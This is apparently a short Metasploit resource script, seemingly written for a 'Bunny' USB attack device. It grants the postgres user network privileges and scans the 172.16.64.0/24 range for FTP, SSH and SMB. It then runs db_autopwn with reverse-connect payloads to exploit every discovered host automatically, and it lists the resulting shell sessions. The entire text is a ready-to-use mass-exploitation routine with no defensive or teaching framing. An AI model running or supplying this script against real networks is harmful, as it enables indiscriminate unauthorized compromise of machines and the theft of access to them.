# Prequisities:
# 1. You must have metasploit installation up and running in path /toos/metasploit-framework/
# 2. One-time fix for adding user "postgres" to the network user groups
usermod -a -G netdev,systemd-network,net_raw postgres

# Connect to pre-created metasploit database called "postgres"
db_connect postgres
load db_autopwn

# This sleep because everytime we load db_autopwn module, metasploit is rebuilding the database cache (need more digging into this to cancel this stage)
sleep 60

# Purge old data to not to be included in the attack
hosts -d
services -d

# Start db_nmap metasploit scanning module (scan all the range except the Bunny itself)
db_nmap 172.16.64.2-254 -p 21,22,137,139,445 -v 1 -O --reason
sleep 5

# Show hosts after db_nmap scan
hosts

# Show services after db_nmap scan
services

# Initiate db_autopwn metasploit module
db_autopwn -t -p -r -e -T 120

# Show created metasploit sessions
sleep 5
sessions
# Finish
sleep 10
